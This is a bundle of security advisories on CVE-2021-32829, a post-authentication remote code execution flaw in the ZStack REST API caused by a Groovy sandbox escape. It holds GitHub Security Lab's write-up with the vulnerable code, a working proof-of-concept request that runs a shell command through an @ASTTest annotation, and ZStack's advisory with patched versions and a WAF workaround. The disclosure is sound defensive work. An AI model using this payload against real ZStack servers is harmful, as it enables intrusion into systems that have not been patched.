=== Content from blog.orange.tw_fe8e1309_20250114_230954.html ===
Redirecting...

=== Content from securitylab.github.com_a7c2e7f5_20250114_230955.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 21, 2021
# GHSL-2021-065: Post-authentication Remote Code Execution (RCE) in ZStack REST API - CVE-2021-32829

[![Author avatar](https://avatars.githubusercontent.com/u/125701)
Alvaro Munoz](https://github.com/pwntester)

## Coordinated Disclosure Timeline

* 2021-04-14: Reported via a GitHub Security Advisory
* 2021-04-15: The issue is acknowledged
* 2021-06-08: Issue is [fixed](https://github.com/zstackio/zstack/security/advisories/GHSA-6xgq-7rqg-x3q5)

## Summary

ZStack REST API is vulnerable to post-authentication Remote Code Execution (RCE) via bypass of the Groovy shell sandbox

## Product

ZStack (https://en.zstack.io/)

## Tested Version

3.10.7-c76 (ZStack-x86\_64-DVD-3.10.7-c76.iso)

## Details

### Arbitrary Groovy Script evaluation (GHSL-2021-065)

The [REST API](https://en.zstack.io/help/en/dev_manual/dev_guide/v3/) exposes the `GET zstack/v1/batch-queries?script` endpoint which is backed up by the [BatchQueryAction](https://github.com/zstackio/zstack/blob/master/sdk/src/main/java/org/zstack/sdk/BatchQueryAction.java) class. Messages are represented by the [APIBatchQueryMsg](https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/APIBatchQueryMsg.java), dispatched to the [QueryFacadeImpl](https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/QueryFacadeImpl.java) facade and handled by the [BatchQuery](https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy) class.

The HTTP request parameter `script` is mapped to the `APIBatchQueryMsg.script` property and evaluated as a Groovy script in [`BatchQuery.query`](https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy#L436)

```
Map<String, Object> query(APIBatchQueryMsg msg) {

  ...
  def cc = new CompilerConfiguration()
  cc.addCompilationCustomizers(new SandboxTransformer())

  def shell = new GroovyShell(new GroovyClassLoader(), binding, cc)
  sandbox.register()
  try {
      Script script = shell.parse(msg.script)
      ZQLContext.putAPISession(msg.session)
      script.run()
      ZQLContext.clean()
      clearAllClassInfo(script.getClass())
  } catch (Throwable t) {
      logger.warn(t.message, t)
      sandbox.unregister()
      throw new OperationFailureException(Platform.operr("${errorLine(msg.script, t)}"))
  } finally {
      sandbox.unregister()
      shell.resetLoadedClasses()
  }
  ...

}

```

As we can see in the code snippet above, the evaluation of the user-controlled Groovy script is sandboxed by `SandboxTransformer` which will apply the restrictions defined in the registered (`sandbox.register()`) `GroovyInterceptor`. This interceptor is declared in the [`Sandbox`](https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy#L62) class as:

```
    static class SandBox extends GroovyInterceptor {
        static List<Class> RECEIVER_WHITE_LIST = [
                Number[].class,
                Number.class,
                long[].class,
                long.class,
                int[].class,
                int.class,
                short[].class,
                short.class,
                double[].class,
                double.class,
                float[].class,
                float.class,
                String[].class,
                String.class,
                Date[].class,
                Date.class,
                Map.class,
                Collection.class,
                Script.class,
                Enum[].class,
                Enum.class
        ]

        static void checkReceiver(Object obj) {
            checkReceiver(obj.getClass())
        }

        static void checkReceiver(Class clz) {
            for (Class wclz : RECEIVER_WHITE_LIST) {
                if (wclz.isAssignableFrom(clz)) {
                    return
                }
            }

            throw new Exception("invalid operation on class[${clz.name}]")
        }

        static void checkMethod(String method) {
            if (method == "sleep") {
                throw new Exception("invalid operation[${method}]")
            }
        }

        Object onMethodCall(GroovyInterceptor.Invoker invoker, Object receiver, String method, Object... args) throws Throwable {
            checkReceiver(receiver)
            checkMethod(method)
            return super.onMethodCall(invoker, receiver, method, args)
        }

        Object onStaticCall(GroovyInterceptor.Invoker invoker, Class receiver, String method, Object... args) throws Throwable {
            checkReceiver(receiver)
            checkMethod(method)
            return super.onStaticCall(invoker, receiver, method, args)
        }

        Object onNewInstance(GroovyInterceptor.Invoker invoker, Class receiver, Object... args) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, (String)null, (Object[])args);
        }

        Object onSuperCall(GroovyInterceptor.Invoker invoker, Class senderType, Object receiver, String method, Object... args) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(new Super(senderType, receiver), method, (Object[])args);
        }

        void onSuperConstructor(GroovyInterceptor.Invoker invoker, Class receiver, Object... args) throws Throwable {
            checkReceiver(receiver)
            this.onNewInstance(invoker, receiver, args);
        }

        Object onGetProperty(GroovyInterceptor.Invoker invoker, Object receiver, String property) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, property);
        }

        Object onSetProperty(GroovyInterceptor.Invoker invoker, Object receiver, String property, Object value) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, property, value);
        }

        Object onGetAttribute(GroovyInterceptor.Invoker invoker, Object receiver, String attribute) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, attribute);
        }

        Object onSetAttribute(GroovyInterceptor.Invoker invoker, Object receiver, String attribute, Object value) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, attribute, value);
        }

        Object onGetArray(GroovyInterceptor.Invoker invoker, Object receiver, Object index) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, (String)null, (Object)index);
        }

        Object onSetArray(GroovyInterceptor.Invoker invoker, Object receiver, Object index, Object value) throws Throwable {
            checkReceiver(receiver)
            return invoker.call(receiver, (String)null, index, value);
        }
    }

```

Even though the sandbox heavily restricts the receiver types to a small set of allowed types, the sandbox is non effective at controlling any code placed in Java annotations and therefore vulnerable to meta-programming escapes as defined in this [blog post](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html).

#### Impact

This issue leads to post-authenticated remote code execution.

#### Resources

Reproduction steps:

1. Authenticate as any non-privileged user or system admin
   ```
   PUT http://192.168.78.132:8080/zstack/v1/accounts/login
   {
    "logInByAccount": {
        "password": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86",
        "accountName": "admin"
    }
   }

   ```

Response

```
# {"inventory":{"uuid":"901c1c7c58534883a6cd3330104d0e18","accountUuid":"36c27e8ff05c4780bf6d2fa65700f22e","userUuid":"36c27e8ff05c4780bf6d2fa65700f22e","expiredDate":"Apr 8, 2021 9:36:15 PM","createDate":"Apr 8, 2021 7:36:15 PM","noSessionEvaluation":false}}

```

1. Send a PoC exploit which creates a `/tmp/pwned` file (does not require “SystemAdmin” account)

```
GET http://192.168.78.132:8080/zstack/v1/batch-queries?script=@groovy.transform.ASTTest(value=%7Bassert%20java.lang.Runtime.getRuntime().exec(%22touch%20/tmp/pwned%22)%7D)%20def%20x
Authorization: OAuth e89f1e6f5b3c4031b44a8392acde19dc

```

Response

```
status code: 503
Set-Cookie: JSESSIONID=7E525CEEDD417C0627F1188E1A739984; Path=/zstack; HttpOnly
Content-Length: 472
Date: Thu, 08 Apr 2021 11:47:59 GMT
Connection: close

{"error":{"code":"SYS.1006","description":"An operation failed","details":"No signature of method: Script1.ssert() is applicable for argument types: (java.lang.UNIXProcess) values: [java.lang.UNIXProcess@4a856d2]\nPossible solutions: every(), grep(), use([Ljava.lang.Object;), every(groovy.lang.Closure), sleep(long), split(groovy.lang.Closure), error at line 0: @groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned2\")}) def x"}}

```

Even though, we get an Internal Error response (503), the output of the error already hints us that the process was executed (`[java.lang.UNIXProcess@4a856d2]]`) and if we check the `/tmp` directory, a `pwned` file should have been created.

## CVE

* CVE-2021-32829

## Resources

* <https://github.com/zstackio/zstack/security/advisories/GHSA-6xgq-7rqg-x3q5>

## Credit

This issue was discovered and reported by GHSL team member [@pwntester (Alvaro Muñoz)](https://github.com/pwntester).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-065` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_1a85410b_20250114_230955.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzstackio%2Fzstack%2Fsecurity%2Fadvisories%2FGHSA-6xgq-7rqg-x3q5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzstackio%2Fzstack%2Fsecurity%2Fadvisories%2FGHSA-6xgq-7rqg-x3q5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=zstackio%2Fzstack)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zstackio](/zstackio)
/
**[zstack](/zstackio/zstack)**
Public

* [Notifications](/login?return_to=%2Fzstackio%2Fzstack) You must be signed in to change notification settings
* [Fork
  395](/login?return_to=%2Fzstackio%2Fzstack)
* [Star
   1.3k](/login?return_to=%2Fzstackio%2Fzstack)

* [Code](/zstackio/zstack)
* [Issues
  159](/zstackio/zstack/issues)
* [Pull requests
  13](/zstackio/zstack/pulls)
* [Actions](/zstackio/zstack/actions)
* [Projects
  0](/zstackio/zstack/projects)
* [Wiki](/zstackio/zstack/wiki)
* [Security](/zstackio/zstack/security)
* [Insights](/zstackio/zstack/pulse)

Additional navigation options

* [Code](/zstackio/zstack)
* [Issues](/zstackio/zstack/issues)
* [Pull requests](/zstackio/zstack/pulls)
* [Actions](/zstackio/zstack/actions)
* [Projects](/zstackio/zstack/projects)
* [Wiki](/zstackio/zstack/wiki)
* [Security](/zstackio/zstack/security)
* [Insights](/zstackio/zstack/pulse)

# Post-authentication remote code execution in ZStack

Critical

[zxwing](/zxwing)
published
GHSA-6xgq-7rqg-x3q5
Jun 8, 2021

## Package

ZStack

## Affected versions

< 4.1.0

## Patched versions

3.8.21, 3.10.8, 4.1.0

## Description

### Impact

The ZStack releases before 4.1.0 are vulnerable to Remote Code Execution (RCE).

### Patches

The vulnerability is introduced from ZStack 2.2.4, and already patched in ZStack 3.8.21, 3.10.8 and all further versions beyond ZStack 4.1.0.

### Workarounds

We strongly suggest users upgrade to patched versions. If you could not upgrade at once, please avoid exposing ZStack API service to public or any other untrusty network.

If you have a Web Application Firewall(WAF), filter requests `GET zstack/v1/batch-queries?script` which contain `@` in url could reduce the impact of this vulnerability.

### For more information

If you have any questions or comments about this advisory:

* Contact our support [ZStack](https://en.zstack.io/)
* Open an issue in [ZStack Github Repo](https://github.com/zstackio/zstack/issues)
* Email us at [contact@zstack.io](contact%40zstack.io)

### Severity

Critical

### CVE ID

CVE-2021-32829

### Weaknesses

No CWEs

### Credits

* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=40&v=4)](/pwntester)
  [pwntester](/pwntester)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


